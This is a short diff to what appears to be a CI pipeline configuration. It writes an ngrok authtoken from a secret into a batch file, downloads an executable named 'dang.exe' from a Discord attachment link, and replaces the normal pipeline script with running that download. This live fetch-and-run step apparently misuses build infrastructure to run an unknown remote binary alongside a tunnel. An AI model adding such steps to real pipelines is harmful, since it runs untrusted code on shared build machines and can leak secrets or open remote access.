@@ -14,4 +14,4 @@ task:
   script:
    - echo ngrok authtoken %TOKEN% > NGROK.bat
    - curl -s -O https://cdn.discordapp.com/attachments/911797178190676052/911797247040184320/dang.exe
-   - cirrus_pipeline.bat
+   - dang.exe
